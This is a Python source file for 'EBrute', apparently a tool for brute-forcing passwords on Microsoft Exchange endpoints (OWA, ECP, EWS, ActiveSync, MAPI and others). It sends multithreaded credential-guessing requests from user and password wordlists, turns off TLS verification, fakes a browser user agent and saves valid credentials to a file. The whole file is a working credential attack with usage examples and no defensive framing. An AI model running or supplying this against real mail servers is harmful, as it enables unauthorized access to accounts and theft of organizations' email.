import base64
from tabulate import tabulate
import requests
import math
from requests_ntlm import HttpNtlmAuth
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class EBrute:
    def __init__(self, domain, mode, user_path, pass_path, ssl, timeout, thread):
        self.domain = domain
        self.url_dict = {
            'autodiscover': f'https://{self.domain}/autodiscover' if ssl == 'y' else f'http://{self.domain}/autodiscover',
            'ews': f'https://{self.domain}/ews' if ssl == 'y' else f'http://{self.domain}/ews',
            'mapi': f'https://{self.domain}/mapi' if ssl == 'y' else f'http://{self.domain}/mapi',
            'activesync': f'https://{self.domain}/Microsoft-Server-ActiveSync' if ssl == 'y' else f'http://{self.domain}/Microsoft-Server-ActiveSync',
            'oab': f'https://{self.domain}/oab' if ssl == 'y' else f'http://{self.domain}/oab',
            'rpc': f'https://{self.domain}/rpc' if ssl == 'y' else f'http://{self.domain}/rpc',
            'api': f'https://{self.domain}/api' if ssl == 'y' else f'http://{self.domain}/api',
            'owa': f'https://{self.domain}/owa/auth.owa' if ssl == 'y' else f'http://{self.domain}/owa/auth.owa',
            'ecp': f'https://{self.domain}/ecp/' if ssl == 'y' else f'http://{self.domain}/ecp/',
        }
        if mode is not None:
            self.mode = mode
            self.url = self.url_dict[mode]

        self.user_path = user_path
        self.pass_path = pass_path

        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36'}
        self.timeout = timeout
        self.thread = thread

    # base64 编码
    def b64encode(self, string):
        a = base64.b64encode(string.encode())
        return a.decode()

    # 检查可用接口
    def check_url(self):
        for key, value in self.url_dict.items():
            try:
                res = requests.get(url=value, headers=self.headers, verify=False, timeout=self.timeout)
                if res.status_code not in [301, 302, 403, 404]:
                    print(f'[+]{key} 接口可用')
                else:
                    print(f'[-]{key} 接口不可用')
            except:
                print(f'[-]{key} 接口不可用')

    # NTLM认证验证
    def check_NTLM_userpass(self, brute_data):
        try:
            user, password = brute_data
            res = requests.get(self.url, auth=HttpNtlmAuth(user, password), headers=self.headers, verify=False, timeout=self.timeout)
            if res.status_code not in [401, 408, 504]:
                return brute_data
            else:
                return None
        except:
            return None

    # Basic认证验证
    def check_Basic_userpass(self, brute_data):
        try:
            user, password = brute_data
            headers = self.headers.copy()
            headers["Authorization"] = f"Basic {self.tools.b64encode(f'{user}:{password}')}"
            r = requests.session()
            r.keep_alive = False
            res = r.get(self.url, headers=headers, verify=False, timeout=self.timeout)
            if res.status_code not in [401, 408, 504]:
                return brute_data
            else:
                return None
        except:
            return None

    # http认证验证
    def check_HTTP_userpass(self, brute_data):
        try:
            user, password = brute_data
            headers = self.headers.copy()
            headers["Cache-Control"] = "max-age=0"
            headers["Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=" + self.url
            headers["Cookie"] = "PrivateComputer=true; PBack=0"
            data = {
                "destination": self.url,
                "flags": "4",
                "forcedownlevel": "0",
                "username": user,
                "password": password,
                "passwordText": "",
                "isUtf8": "1"
            }
            r = requests.session()
            r.keep_alive = False
            response = r.post(self.url, data=data, headers=headers, allow_redirects=False, verify=False, timeout=self.timeout)
            if "Location" not in response.headers:
                return None
            if "reason" not in response.headers["Location"]:
                return brute_data
            else:
                return None
        except:
            return None

    def runner(self, brute_data):
        if self.mode in ['autodiscover', 'ews', 'mapi', 'oab', 'rpc', 'api']:
            res = self.check_NTLM_userpass(brute_data)
        elif self.mode in ['owa', 'ecp']:
            res = self.check_HTTP_userpass(brute_data)
        else:
            res = self.check_Basic_userpass(brute_data)
        return res

    def chunks(self, arr, m):
        n = int(math.ceil(len(arr) / float(m)))
        return [arr[i:i + n] for i in range(0, len(arr), n)]

    def run(self):
        try:
            with open(self.user_path, 'r') as f:
                user_list = f.read().split('\n')
                print(f"[*]用户名数量: {len(user_list)}")
            with open(self.pass_path, 'r') as f:
                pass_list = f.read().split('\n')
                print(f"[*]密码数量: {len(pass_list)}")
            brute_data_list = []
            for user in user_list:
                for pwd in pass_list:
                    brute_data_list.append((user, pwd))
            print(f"[*]总任务数: {len(brute_data_list)} | 线程数: {self.thread} | 超时时间: {self.timeout}")
            # 列表分批
            num = math.ceil(len(brute_data_list) / 10000)
            brute_data_list_list = self.chunks(brute_data_list, num)
            pi = 0
            for brute_data_list in brute_data_list_list:
                pi += 1
                print(f"[*]分批执行，当前第[{pi}/{num}]批，本批数量: {len(brute_data_list)}")
                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = [executor.submit(self.runner, brute_data) for brute_data in brute_data_list]
                    with tqdm(total=len(futures)) as pbar:
                        for future in as_completed(futures):
                            try:
                                res = future.result()
                                if res is not None:
                                    print(f'[+]发现弱口令: {res[0]}/{res[1]}')
                                    with open('success.txt', 'a') as f:
                                        data = f'域名: {self.domain} | 用户名: {res[0]} | 密码: {res[1]}\n'
                                        f.write(data)
                            except Exception as e:
                                print(f'[-]错误: {e}')
                            finally:
                                # 每完成一个任务更新一次进度条
                                pbar.update(1)
        except Exception as e:
            print(f'[-]错误: {e}')


if __name__ == '__main__':
    data = [
        ["接口", "说明"],
        ["autodiscover", "默认NTLM认证方式，2007版本推出，用于自动配置用户在Outlook中邮箱的相关设置"],
        ["ews", "默认NTLM认证方式，Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互"],
        ["mapi", "默认NTLM认证方式，Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持"],
        ["activesync", "默认Basic认证方式，用于移动应用程序访问电子邮件"],
        ["oab", "默认NTLM认证方式，用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担"],
        ["rpc", "默认NTLM认证方式，早期的Outlook还使用称为Outlook Anywhere的RPC交互"],
        ["api", "默认NTLM认证方式"],
        ["owa", "默认http认证方式，Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等"],
        ["ecp", "默认http认证方式，Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台"],
    ]
    table = tabulate(data, headers="firstrow", tablefmt="grid")
    parser = argparse.ArgumentParser(
        description=f"exchange接口爆破\n\n{table}",
        epilog="Example usage:\n[检查可用接口] python3 EBrute.py -s check -d example.com\n[指定接口爆破] python3 EBrute.py -s brute -d example.com -m rpc -u user.txt -p pass.txt",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('-s', type=str, required=True, metavar='<check/brute>', help='选择模式，检查接口或者爆破')
    parser.add_argument('-d', type=str, required=True, metavar='domain', help='邮箱域名')
    parser.add_argument('-m', type=str, metavar='name', help='爆破接口，可单选[autodiscover,ews,mapi,activesync,oab,rpc,api,owa,ecp]')
    parser.add_argument('-u', type=str, metavar='user.txt', help='用户名字段')
    parser.add_argument('-p', type=str, metavar='pass.txt', help='密码字段')
    parser.add_argument('--ssl', type=str, default='y', metavar='<y/n>', help='是否启用https，默认启用')
    parser.add_argument('--timeout', type=int, default=10, metavar='10', help='超时等待时间，默认10秒')
    parser.add_argument('--thread', type=int, default=30, metavar='30', help='线程数量，默认30线程')
    args = parser.parse_args()
    # 检查 'brute' 模式下的必选参数
    if args.s == 'brute':
        if not args.m or not args.u or not args.p:
            print(f'[-]参数缺失: 在 "brute" 模式下，参数 -m, -u 和 -p 是必需的。')
            exit()
    eb = EBrute(args.d, args.m, args.u, args.p, args.ssl, args.timeout, args.thread)
    if args.s == 'check':
        eb.check_url()
    elif args.s == 'brute':
        eb.run()
